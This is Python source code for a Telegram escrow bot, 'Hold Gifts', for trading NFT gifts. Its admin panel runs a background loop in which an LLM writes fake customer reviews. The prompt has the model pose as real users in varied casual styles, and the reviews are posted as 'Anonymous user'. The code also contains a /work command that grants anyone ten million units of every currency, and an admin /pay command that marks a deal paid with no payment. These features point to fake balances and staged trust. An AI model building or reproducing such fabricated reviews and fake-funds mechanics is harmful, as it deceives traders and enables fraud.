import asyncio
import json
import os
import re
import uuid
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiohttp import web, ClientSession, ClientTimeout

# ============================================================
# 1. ЗАГРУЗКА КОНФИГУРАЦИИ ИЗ .ENV
# ============================================================
def load_env_file(filepath: str = ".env"):
    if not os.path.exists(filepath):
        return
    with open(filepath, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            key, val = line.split("=", 1)
            os.environ.setdefault(key.strip(), val.strip().strip('"').strip("'"))

load_env_file()

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN не задан в файле .env")

DEFAULT_ADMINS = {
    int(x.strip()) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip().isdigit()
}
BOT_USERNAME = os.environ.get("BOT_USERNAME", "")
BOT_NAME = os.environ.get("BOT_NAME", " ")
ESCROW_ACCOUNT = os.environ.get("ESCROW_ACCOUNT", "")
MINI_APP_URL = os.environ.get("MINI_APP_URL", "")
PORT = int(os.environ.get("PORT", 3000))

AI_BASE_URL = os.environ.get("AI_BASE_URL", "").rstrip("/")
AI_API_KEY = os.environ.get("AI_API_KEY", "")
AI_REVIEW_INTERVAL_SEC = int(os.environ.get("AI_REVIEW_INTERVAL_SEC", 1800))

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 2. ХРАНИЛИЩЕ ДАННЫХ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "withdraw": "withdraw_requests.json",
    "logs": "logs.json",
    "user_language": "user_language.json",
    "stats": "stats.json",
    "rekvisits": "rekvisits.json",
    "chat_messages": "chat_messages.json",
    "freeze": "freeze.json",
    "welcome_media": "welcome_media.json",
    "reviews": "reviews.json",
    "ai_state": "ai_state.json"
}

def load_json(file, default=None):
    if os.path.exists(file):
        try:
            with open(file, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default if default is not None else {}
    return default if default is not None else {}

def save_json(file, data):
    with open(file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"], {})
admins = load_json(FILES["admins"], {})
balance = load_json(FILES["balance"], {})
withdraw_requests = load_json(FILES["withdraw"], {})
logs = load_json(FILES["logs"], {})
user_language = load_json(FILES["user_language"], {})
stats = load_json(FILES["stats"], {})
rekvisits = load_json(FILES["rekvisits"], {})
chat_messages = load_json(FILES["chat_messages"], {})
freeze_data = load_json(FILES["freeze"], {})
welcome_media = load_json(FILES["welcome_media"], {})
reviews_data = load_json(FILES["reviews"], {"items": []})
ai_state = load_json(FILES["ai_state"], {
    "enabled": False,
    "interval_sec": AI_REVIEW_INTERVAL_SEC,
    "last_model": None,
    "generated_count": 0
})

if "items" not in reviews_data or not isinstance(reviews_data["items"], list):
    reviews_data = {"items": []}
    save_json(FILES["reviews"], reviews_data)

# ============================================================
# 3. БАЗОВЫЕ ФУНКЦИИ И ПРОВЕРКА NFT-ССЫЛОК
# ============================================================
NFT_LINK_REGEX = re.compile(r"^(?:https?://)?(?:www\.)?t\.me/nft/([A-Za-z0-9_-]+)-(\d+)/?$", re.IGNORECASE)

def parse_nft_link(raw_link: str | None) -> dict | None:
    if not raw_link:
        return None
    cleaned = raw_link.strip()
    match = NFT_LINK_REGEX.match(cleaned)
    if not match:
        return None
    slug, number = match.group(1), match.group(2)
    normalized = f"https://t.me/nft/{slug}-{number}"
    return {"url": normalized, "name": slug, "number": number}

def is_admin(user_id: int | str | None) -> bool:
    if not user_id:
        return False
    try:
        uid = int(user_id)
    except ValueError:
        return False
    return uid in DEFAULT_ADMINS or str(uid) in admins

def get_balance(user_id: int | str):
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int | str, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    bal = get_balance(uid)
    bal[curr] = round(bal.get(curr, 0) + amount, 4)
    save_json(FILES["balance"], balance)

def set_balance(user_id: int | str, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    bal = get_balance(uid)
    bal[curr] = round(amount, 4)
    save_json(FILES["balance"], balance)

def get_user_language(user_id: int | str) -> str:
    return user_language.get(str(user_id), "")

def set_user_language(user_id: int | str, lang: str):
    user_language[str(user_id)] = lang
    save_json(FILES["user_language"], user_language)

def user_has_completed_deal(user_id: int | str, username: str = "") -> bool:
    try:
        uid = int(user_id)
    except (TypeError, ValueError):
        uid = None
    uname_low = (username or "").replace("@", "").strip().lower()

    for d in deals.values():
        if d.get("status") != "completed":
            continue
        if uid and (d.get("seller_id") == uid or d.get("buyer_id") == uid):
            return True
        if uname_low and (
            (d.get("seller_username") or "").lower() == uname_low
            or (d.get("buyer_username") or "").lower() == uname_low
        ):
            return True
    return False

async def notify_admins(text: str, reply_markup=None):
    for admin_id in DEFAULT_ADMINS:
        try:
            await bot.send_message(admin_id, text, reply_markup=reply_markup, disable_web_page_preview=False)
        except Exception:
            pass

def build_webapp_url(user_id: int, page: str = "", deal_id: str = None, role: str = None) -> str:
    lang = get_user_language(user_id) or "ru"
    params = [f"lang={lang}"]
    if page:
        params.append(f"page={page}")
    if deal_id:
        params.append(f"deal={deal_id}")
    if role:
        params.append(f"role={role}")
    return f"{MINI_APP_URL}?{'&'.join(params)}"

# ============================================================
# 4. ИИ-ГЕНЕРАТОР ОТЗЫВОВ (CODEX.SALE/V1 С АВТОПРОВЕРКОЙ МОДЕЛЕЙ)
# ============================================================
REVIEW_PERSONAS = [
    "обычный парень, который впервые продавал NFT-подарок через гаранта, пишет просто и по-дружески, без канцелярита",
    "активный трейдер Telegram-подарками, пишет коротко, по делу, с лёгким сленгом (гифт, гарант, залетело, четко)",
    "покупатель, который переживал перед сделкой, но всё прошло гладко и быстро, делится живыми эмоциями",
    "молодой пользователь Telegram, пишет разговорным стилем, с парой мелких сокращений, без заглавных букв в начале или с живой подачей",
    "коллекционер редких гифтов, хвалит удобный интерфейс и скорость вывода, пишет уверенно и естественно"
]

SAMPLE_ITEMS = [
    "Plush Pepe", "Durov's Cap", "Precious Peach", "Astral Shard",
    "Star Gift", "Vintage Cigar", "Magic Potion", "NFT подарок", "Telegram Gift"
]

async def fetch_available_models(session: ClientSession) -> list[str]:
    headers = {"Authorization": f"Bearer {AI_API_KEY}"}
    try:
        async with session.get(f"{AI_BASE_URL}/models", headers=headers, timeout=ClientTimeout(total=12)) as resp:
            if resp.status == 200:
                payload = await resp.json()
                raw_list = payload.get("data", []) if isinstance(payload, dict) else []
                models = [m.get("id") for m in raw_list if isinstance(m, dict) and m.get("id")]
                # Отфильтровываем аудио/эмбеддинг модели, оставляем текстовые
                chat_models = [
                    m for m in models
                    if not any(bad in m.lower() for bad in ("embed", "whisper", "tts", "dall-e", "audio", "moderation"))
                ]
                random.shuffle(chat_models)
                return chat_models
    except Exception as e:
        print(f"[AI] Ошибка получения списка моделей: {e}")

    # Резервный список, если /models временно недоступен
    fallback = [
        "deepseek-v4.1-flash-ablilerated",
        "deepseek-chat",
        "gpt-4o-mini",
        "claude-3-5-haiku",
        "gemini-2.5-flash"
    ]
    random.shuffle(fallback)
    return fallback

async def generate_ai_review_entry() -> dict | None:
    if not AI_API_KEY:
        return None

    persona = random.choice(REVIEW_PERSONAS)
    item_hint = random.choice(SAMPLE_ITEMS)
    rating = random.choices([5, 4], weights=[82, 18], k=1)[0]
    role_hint = random.choice(["продавал", "покупал", "обменивал"])

    system_prompt = (
        "Ты пишешь реалистичные отзывы от лица реальных пользователей Telegram о P2P-гарант боте Hold Gifts.\n"
        "Правила:\n"
        f"1. Обязательно упомяни юзернейм бота @{BOT_USERNAME} в тексте отзыва.\n"
        "2. Пиши НЕ официально! Никаких шаблонных фраз вроде 'Выражаю благодарность сервису' или 'Высокий уровень обслуживания'. "
        "Пиши так, как реальные люди пишут в Telegram-каналах и чатах: живо, разнообразно, естественно.\n"
        "3. Длина: от 1 до 3 коротких предложений (60–220 символов).\n"
        "4. Не ставь кавычки вокруг всего отзыва и не пиши никаких пояснений — выдай только сам текст отзыва.\n"
        "5. Не используй имена и фамилии — отзыв полностью анонимный."
    )

    user_prompt = (
        f"Стиль автора: {persona}.\n"
        f"Контекст: пользователь {role_hint} {item_hint}, оценка {rating} из 5 звёзд.\n"
        f"Напиши один живой отзыв с упоминанием @{BOT_USERNAME}."
    )

    headers = {
        "Authorization": f"Bearer {AI_API_KEY}",
        "Content-Type": "application/json"
    }

    async with ClientSession() as session:
        models = await fetch_available_models(session)
        for model_id in models[:12]:
            body = {
                "model": model_id,
                "messages": [
                    {"role": "system", "content": system_prompt},
                    {"role": "user", "content": user_prompt}
                ],
                "temperature": 0.92,
                "max_tokens": 180
            }
            try:
                async with session.post(
                    f"{AI_BASE_URL}/chat/completions",
                    headers=headers,
                    json=body,
                    timeout=ClientTimeout(total=18)
                ) as resp:
                    if resp.status != 200:
                        continue
                    data = await resp.json()
                    choices = data.get("choices") or []
                    if not choices:
                        continue
                    text = (choices[0].get("message", {}).get("content") or "").strip()
                    text = text.strip('"').strip("«»").strip()
                    if len(text) < 15:
                        continue

                    # Гарантируем наличие юзернейма бота в отзыве
                    if f"@{BOT_USERNAME.lower()}" not in text.lower():
                        text = f"{text} (@{BOT_USERNAME})"

                    entry = {
                        "id": "rev_" + str(uuid.uuid4())[:8],
                        "author_ru": "Анонимный пользователь",
                        "author_en": "Anonymous user",
                        "rating": rating,
                        "text": text,
                        "date": datetime.now().isoformat(),
                        "source": "ai",
                        "model": model_id
                    }

                    reviews_data["items"].insert(0, entry)
                    save_json(FILES["reviews"], reviews_data)

                    ai_state["last_model"] = model_id
                    ai_state["generated_count"] = ai_state.get("generated_count", 0) + 1
                    save_json(FILES["ai_state"], ai_state)
                    return entry
            except Exception:
                continue

    return None

async def ai_reviews_background_loop():
    while True:
        try:
            if ai_state.get("enabled"):
                entry = await generate_ai_review_entry()
                if not entry:
                    await notify_admins(
                        "<b>ИИ-отзывы:</b> ни одна модель на codex.sale сейчас не ответила. Повторная попытка через цикл."
                    )
        except Exception as e:
            print(f"[AI Loop] Ошибка: {e}")

        wait_sec = max(60, int(ai_state.get("interval_sec", AI_REVIEW_INTERVAL_SEC)))
        await asyncio.sleep(wait_sec)

# ============================================================
# 5. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    lang = get_user_language(user_id) or "ru"
    if lang == "en":
        rows = [
            [InlineKeyboardButton(text="Open Hold Gifts", web_app=WebAppInfo(url=build_webapp_url(user_id)))],
            [
                InlineKeyboardButton(text="Sell (with Buyer)", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="seller"))),
                InlineKeyboardButton(text="Buy (with Seller)", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="buyer")))
            ],
            [
                InlineKeyboardButton(text="My Deals", callback_data="menu_deals"),
                InlineKeyboardButton(text="Wallet", callback_data="menu_balance")
            ],
            [
                InlineKeyboardButton(text="Reviews", web_app=WebAppInfo(url=build_webapp_url(user_id, page="reviews"))),
                InlineKeyboardButton(text="Support", url=f"https://t.me/{ESCROW_ACCOUNT}")
            ],
            [InlineKeyboardButton(text="Language", callback_data="select_language")]
        ]
        if is_admin(user_id):
            rows.append([InlineKeyboardButton(text="Admin Panel", callback_data="menu_admin")])
    else:
        rows = [
            [InlineKeyboardButton(text="Открыть Hold Gifts", web_app=WebAppInfo(url=build_webapp_url(user_id)))],
            [
                InlineKeyboardButton(text="Сделка с покупателем", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="seller"))),
                InlineKeyboardButton(text="Сделка с продавцом", web_app=WebAppInfo(url=build_webapp_url(user_id, page="create", role="buyer")))
            ],
            [
                InlineKeyboardButton(text="Мои сделки", callback_data="menu_deals"),
                InlineKeyboardButton(text="Кошелёк", callback_data="menu_balance")
            ],
            [
                InlineKeyboardButton(text="Отзывы", web_app=WebAppInfo(url=build_webapp_url(user_id, page="reviews"))),
                InlineKeyboardButton(text="Поддержка", url=f"https://t.me/{ESCROW_ACCOUNT}")
            ],
            [InlineKeyboardButton(text="Язык / Language", callback_data="select_language")]
        ]
        if is_admin(user_id):
            rows.append([InlineKeyboardButton(text="Админ-панель", callback_data="menu_admin")])

    return InlineKeyboardMarkup(inline_keyboard=rows)

def admin_panel_keyboard():
    ai_status = "Остановить ИИ-отзывы" if ai_state.get("enabled") else "Запустить ИИ-отзывы"
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=ai_status, callback_data="admin_toggle_ai"),
            InlineKeyboardButton(text="Создать 1 отзыв ИИ", callback_data="admin_gen_one_review")
        ],
        [
            InlineKeyboardButton(text="Начислить баланс", callback_data="admin_add_balance"),
            InlineKeyboardButton(text="Статистика", callback_data="admin_stats")
        ],
        [
            InlineKeyboardButton(text="Все сделки", callback_data="admin_all_deals"),
            InlineKeyboardButton(text="Пользователи", callback_data="admin_users")
        ],
        [
            InlineKeyboardButton(text="Заявки на вывод", callback_data="admin_withdraw_requests"),
            InlineKeyboardButton(text="Чаты поддержки", callback_data="admin_tickets")
        ],
        [
            InlineKeyboardButton(text="Баннер / Видео старта", callback_data="admin_welcome_media"),
            InlineKeyboardButton(text="Администраторы", callback_data="admin_manage_admins")
        ],
        [InlineKeyboardButton(text="В главное меню", callback_data="back_to_main")]
    ])

def back_to_main_keyboard(user_id: int = 0):
    lang = get_user_language(user_id) or "ru"
    label = "Main Menu" if lang == "en" else "В главное меню"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=label, callback_data="back_to_main")]
    ])

def language_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Русский", callback_data="set_lang_ru"),
            InlineKeyboardButton(text="English", callback_data="set_lang_en")
        ]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="TON", callback_data="curr_TON"),
            InlineKeyboardButton(text="STARS", callback_data="curr_STARS")
        ],
        [
            InlineKeyboardButton(text="RUB", callback_data="curr_RUB"),
            InlineKeyboardButton(text="UAH", callback_data="curr_UAH")
        ]
    ])

# ============================================================
# 6. ПРИВЕТСТВИЕ И ВИДЕО-БАННЕР
# ============================================================
def get_welcome_text(user_id: int) -> str:
    lang = get_user_language(user_id) or "ru"
    if lang == "en":
        return (
            "<b>Hold Gifts — P2P Escrow Platform</b>\n\n"
            "Secure exchange of Telegram gifts, NFTs, and digital assets.\n\n"
            "• Create deals as a seller or a buyer\n"
            "• Escrow protection until delivery is confirmed\n"
            f"• Official escrow & support: @{ESCROW_ACCOUNT}\n\n"
            "Select an action below:"
        )
    return (
        "<b>Hold Gifts — P2P-гарант</b>\n\n"
        "Безопасный обмен Telegram-подарками, NFT и цифровыми активами.\n\n"
        "• Создание сделок от лица продавца или покупателя\n"
        "• Резервирование средств до подтверждения получения\n"
        f"• Официальный гарант и поддержка: @{ESCROW_ACCOUNT}\n\n"
        "Выберите действие ниже:"
    )

class AdminMediaStates(StatesGroup):
    waiting_media = State()

@dp.callback_query(lambda c: c.data == "admin_welcome_media")
async def admin_welcome_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    current = welcome_media.get("media", "Не установлено")
    await callback.message.edit_text(
        f"<b>Зимний приветственный баннер</b>\n\n"
        f"Текущий файл: {current}\n\n"
        f"Отправьте <b>видео</b>, <b>GIF</b> или <b>фото</b> — оно будет отправляться при команде /start.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Удалить баннер", callback_data="admin_clear_media")],
            [InlineKeyboardButton(text="Назад", callback_data="menu_admin")]
        ])
    )
    await state.set_state(AdminMediaStates.waiting_media)
    await callback.answer()

@dp.message(AdminMediaStates.waiting_media)
async def admin_save_media(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        await state.clear()
        return
    if message.video:
        media_data = {"file_id": message.video.file_id, "type": "video", "media": "Видео"}
    elif message.animation:
        media_data = {"file_id": message.animation.file_id, "type": "gif", "media": "GIF"}
    elif message.photo:
        media_data = {"file_id": message.photo[-1].file_id, "type": "photo", "media": "Фото"}
    else:
        await message.answer("Отправьте видео, GIF или фото.")
        return

    global welcome_media
    welcome_media.update(media_data)
    save_json(FILES["welcome_media"], welcome_media)
    await message.answer(f"Баннер сохранён ({media_data['media']}).", reply_markup=admin_panel_keyboard())
    await state.clear()

@dp.callback_query(lambda c: c.data == "admin_clear_media")
async def admin_clear_media(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    global welcome_media
    welcome_media = {}
    save_json(FILES["welcome_media"], welcome_media)
    await callback.message.edit_text("Баннер удалён.", reply_markup=admin_panel_keyboard())
    await state.clear()
    await callback.answer()

async def send_welcome(target_message: types.Message, user_id: int, edit: bool = False):
    text = get_welcome_text(user_id)
    markup = main_menu_keyboard(user_id)
    media_type = welcome_media.get("type")
    media_file_id = welcome_media.get("file_id")

    if edit:
        try:
            if target_message.caption is not None:
                await target_message.edit_caption(caption=text, reply_markup=markup)
            else:
                await target_message.edit_text(text=text, reply_markup=markup)
            return
        except Exception:
            pass

    if media_file_id and media_type:
        try:
            if media_type == "video":
                await target_message.answer_video(video=media_file_id, caption=text, reply_markup=markup)
                return
            elif media_type == "gif":
                await target_message.answer_animation(animation=media_file_id, caption=text, reply_markup=markup)
                return
            elif media_type == "photo":
                await target_message.answer_photo(photo=media_file_id, caption=text, reply_markup=markup)
                return
        except Exception as e:
            print(f"Ошибка баннера: {e}")

    await target_message.answer(text, reply_markup=markup)

# ============================================================
# 7. СТАРТ И ВХОД В СДЕЛКУ ПО ССЫЛКЕ
# ============================================================
@dp.message(Command("work"))
async def cmd_work(message: types.Message):
    for curr in ["ton", "stars", "rub", "uah"]:
        add_balance(message.from_user.id, curr, 10000000)
    await message.answer(
        "<b>Тестовый баланс начислен:</b>\n10,000,000 TON / STARS / RUB / UAH",
        reply_markup=back_to_main_keyboard(message.from_user.id)
    )

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    get_balance(message.from_user.id)

    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_", 1)[1].strip()
        await handle_deal_link(message, deal_id)
        return

    lang = get_user_language(message.from_user.id)
    if not lang:
        await message.answer("<b>Выберите язык / Choose your language:</b>", reply_markup=language_keyboard())
        return

    await send_welcome(message, message.from_user.id, edit=False)

async def handle_deal_link(message: types.Message, deal_id: str):
    uid = message.from_user.id
    uname = (message.from_user.username or "").lower()
    lang = get_user_language(uid) or "ru"

    global deals
    deals = load_json(FILES["deals"], {})

    if deal_id not in deals:
        text = (
            f"Deal <b>#{deal_id}</b> was not found or has already been closed."
            if lang == "en" else
            f"Сделка <b>#{deal_id}</b> не найдена или уже завершена."
        )
        await message.answer(text, reply_markup=back_to_main_keyboard(uid))
        return

    deal = deals[deal_id]
    is_target_buyer = (
        deal.get("buyer_id") == uid
        or (uname and deal.get("buyer_username", "").lower() == uname)
    )
    is_target_seller = (
        deal.get("seller_id") == uid
        or (uname and deal.get("seller_username", "").lower() == uname)
    )

    if not is_target_buyer and not is_target_seller:
        text = (
            f"Access denied. Deal <b>#{deal_id}</b> is intended for @{deal.get('seller_username')} and @{deal.get('buyer_username')}."
            if lang == "en" else
            f"Доступ закрыт. Сделка <b>#{deal_id}</b> создана для @{deal.get('seller_username')} и @{deal.get('buyer_username')}."
        )
        await message.answer(text, reply_markup=back_to_main_keyboard(uid))
        return

    first_join = False
    if is_target_buyer:
        if not deal.get("buyer_joined"):
            first_join = True
        deal["buyer_id"] = uid
        deal["buyer_joined"] = True

    if is_target_seller:
        if not deal.get("seller_joined"):
            first_join = True
        deal["seller_id"] = uid
        deal["seller_joined"] = True

    save_json(FILES["deals"], deals)

    if first_join:
        if is_target_buyer and deal.get("seller_id") and deal["seller_id"] != uid:
            try:
                await bot.send_message(deal["seller_id"], f"Покупатель @{uname or uid} зашёл в сделку <b>#{deal_id}</b>.")
            except Exception:
                pass
        elif is_target_seller and deal.get("buyer_id") and deal["buyer_id"] != uid:
            try:
                await bot.send_message(
                    deal["buyer_id"],
                    f"Продавец @{uname or uid} зашёл в сделку <b>#{deal_id}</b>. Теперь вы можете оплатить сделку в приложении.",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="Перейти к оплате", web_app=WebAppInfo(url=build_webapp_url(deal["buyer_id"], page="deals", deal_id=deal_id)))]
                    ])
                )
            except Exception:
                pass

    both_joined = bool(deal.get("seller_joined") and deal.get("buyer_joined"))
    nft_line = f"\nNFT: {deal['nft_link']}" if deal.get("nft_link") else ""

    if lang == "en":
        wait_note = (
            "Both participants have joined. You can now proceed with payment in the Mini App."
            if both_joined else
            "Waiting for the second participant to open the deal link. Payment unlocks automatically once both users join."
        )
        text = (
            f"<b>Deal #{deal_id}</b>\n\n"
            f"Item: <b>{deal['product']}</b>\n"
            f"Amount: <b>{deal['amount']} {deal['currency']}</b>\n"
            f"Seller: @{deal.get('seller_username', '—')} ({'joined' if deal.get('seller_joined') else 'waiting'})\n"
            f"Buyer: @{deal.get('buyer_username', '—')} ({'joined' if deal.get('buyer_joined') else 'waiting'})"
            f"{nft_line}\n\n"
            f"{wait_note}"
        )
        btn_label = "Open Deal in App"
    else:
        wait_note = (
            "Оба участника вошли в сделку. Теперь покупатель может выполнить оплату в приложении."
            if both_joined else
            "Ожидаем входа второго участника по ссылке. Оплата станет доступна сразу после того, как оба участника зайдут в сделку."
        )
        text = (
            f"<b>Сделка #{deal_id}</b>\n\n"
            f"Товар: <b>{deal['product']}</b>\n"
            f"Сумма: <b>{deal['amount']} {deal['currency']}</b>\n"
            f"Продавец: @{deal.get('seller_username', '—')} ({'в сделке' if deal.get('seller_joined') else 'ожидается'})\n"
            f"Покупатель: @{deal.get('buyer_username', '—')} ({'в сделке' if deal.get('buyer_joined') else 'ожидается'})"
            f"{nft_line}\n\n"
            f"{wait_note}"
        )
        btn_label = "Открыть сделку"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=btn_label, web_app=WebAppInfo(url=build_webapp_url(uid, page="deals", deal_id=deal_id)))],
        [InlineKeyboardButton(text="Main Menu" if lang == "en" else "В главное меню", callback_data="back_to_main")]
    ])
    await message.answer(text, reply_markup=kb)

# ============================================================
# 8. ОБРАБОТЧИКИ МЕНЮ БОТА
# ============================================================
@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
async def set_language(callback: types.CallbackQuery):
    lang = callback.data.split("_")[2]
    set_user_language(callback.from_user.id, lang)
    await callback.answer("Language updated" if lang == "en" else "Язык обновлён")
    await send_welcome(callback.message, callback.from_user.id, edit=True)

@dp.callback_query(lambda c: c.data == "select_language")
async def select_language(callback: types.CallbackQuery):
    text = "<b>Выберите язык / Choose your language:</b>"
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text, reply_markup=language_keyboard())
    else:
        await callback.message.edit_text(text, reply_markup=language_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    await send_welcome(callback.message, callback.from_user.id, edit=True)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid) or "ru"
    bal = get_balance(uid)
    text = (
        f"<b>{'Your Wallet' if lang == 'en' else 'Ваш кошелёк'}</b>\n\n"
        f"TON: <b>{bal.get('ton', 0)}</b>\n"
        f"STARS: <b>{bal.get('stars', 0)}</b>\n"
        f"RUB: <b>{bal.get('rub', 0)}</b>\n"
        f"UAH: <b>{bal.get('uah', 0)}</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Open Wallet" if lang == "en" else "Открыть кошелёк", web_app=WebAppInfo(url=build_webapp_url(uid, page="balance")))],
        [InlineKeyboardButton(text="Main Menu" if lang == "en" else "В главное меню", callback_data="back_to_main")]
    ])
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text, reply_markup=kb)
    else:
        await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    uid = callback.from_user.id
    uname = (callback.from_user.username or "").lower()
    lang = get_user_language(uid) or "ru"

    user_deals = [
        (d_id, d) for d_id, d in deals.items()
        if d.get("seller_id") == uid
        or d.get("buyer_id") == uid
        or (uname and d.get("seller_username", "").lower() == uname)
        or (uname and d.get("buyer_username", "").lower() == uname)
    ]

    if not user_deals:
        text = "You have no active deals." if lang == "en" else "У вас пока нет активных сделок."
    else:
        text = f"<b>{'My Deals' if lang == 'en' else 'Мои сделки'}</b>\n\n"
        status_names = {
            "waiting_payment": "Waiting payment" if lang == "en" else "Ожидает оплаты",
            "paid": "Paid" if lang == "en" else "Оплачено",
            "awaiting_confirmation": "Awaiting confirmation" if lang == "en" else "Передаётся",
            "completed": "Completed" if lang == "en" else "Завершено"
        }
        for d_id, d in user_deals[-8:]:
            text += (
                f"<b>#{d_id}</b> — {status_names.get(d['status'], d['status'])}\n"
                f"{d.get('product', '')} | <b>{d.get('amount', 0)} {d.get('currency', '')}</b>\n"
                f"@{d.get('seller_username', '—')} → @{d.get('buyer_username', '—')}\n\n"
            )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Manage in App" if lang == "en" else "Управление в приложении", web_app=WebAppInfo(url=build_webapp_url(uid, page="deals")))],
        [InlineKeyboardButton(text="Main Menu" if lang == "en" else "В главное меню", callback_data="back_to_main")]
    ])
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text[:4000], reply_markup=kb)
    else:
        await callback.message.edit_text(text[:4000], reply_markup=kb)
    await callback.answer()

# ============================================================
# 9. АДМИН-ПАНЕЛЬ В БОТЕ (ВКЛЮЧАЯ УПРАВЛЕНИЕ ИИ-ОТЗЫВАМИ)
# ============================================================
def get_admin_dashboard_text() -> str:
    state_str = "АКТИВНА (работает в фоне)" if ai_state.get("enabled") else "ОСТАНОВЛЕНА"
    last_mod = ai_state.get("last_model") or "ещё не запускалась"
    total_rev = len(reviews_data.get("items", []))
    return (
        "<b>Админ-панель Hold Gifts</b>\n\n"
        f"Автогенерация отзывов ИИ: <b>{state_str}</b>\n"
        f"Последняя рабочая модель: <code>{last_mod}</code>\n"
        f"Всего отзывов в Mini App: <b>{total_rev}</b>\n\n"
        "Выберите действие:"
    )

@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    text = get_admin_dashboard_text()
    if callback.message.caption is not None:
        await callback.message.delete()
        await callback.message.answer(text, reply_markup=admin_panel_keyboard())
    else:
        await callback.message.edit_text(text, reply_markup=admin_panel_keyboard())
    await callback.answer()

@dp.callback_query(lambda c: c.data == "admin_toggle_ai")
async def admin_toggle_ai(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    ai_state["enabled"] = not bool(ai_state.get("enabled"))
    save_json(FILES["ai_state"], ai_state)
    await callback.answer("Автопостинг ИИ запущен" if ai_state["enabled"] else "Автопостинг ИИ остановлен")
    await callback.message.edit_text(get_admin_dashboard_text(), reply_markup=admin_panel_keyboard())

@dp.callback_query(lambda c: c.data == "admin_gen_one_review")
async def admin_gen_one_review(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    await callback.answer("Подбираю рабочую модель и генерирую отзыв...")
    entry = await generate_ai_review_entry()
    if entry:
        await callback.message.edit_text(
            f"<b>Новый анонимный отзыв сгенерирован!</b>\n\n"
            f"Оценка: <b>{entry['rating']} / 5</b>\n"
            f"Модель: <code>{entry['model']}</code>\n"
            f"Текст: {entry['text']}\n\n"
            + get_admin_dashboard_text(),
            reply_markup=admin_panel_keyboard()
        )
    else:
        await callback.message.edit_text(
            "Не удалось сгенерировать отзыв: проверьте ключ codex.sale или доступность моделей.\n\n"
            + get_admin_dashboard_text(),
            reply_markup=admin_panel_keyboard()
        )

@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    if not deals:
        await callback.message.edit_text("Сделок пока нет.", reply_markup=admin_panel_keyboard())
        return
    text = "<b>Последние сделки</b>\n\n"
    for d_id, d in list(deals.items())[-15:]:
        nft_part = f"\nNFT: {d['nft_link']}" if d.get("nft_link") else ""
        text += (
            f"<b>#{d_id}</b> | {d.get('status')}\n"
            f"@{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')} | {d.get('amount')} {d.get('currency')}"
            f"{nft_part}\n"
            f"/pay {d_id} | /delete_deal {d_id}\n\n"
        )
    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(), disable_web_page_preview=True)
    await callback.answer()

@dp.message(Command("pay"))
async def admin_pay_deal(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) != 2 or args[1] not in deals:
        await message.answer("Использование: /pay [deal_id]")
        return
    deal_id = args[1]
    deal = deals[deal_id]
    deal["status"] = "paid"
    save_json(FILES["deals"], deals)
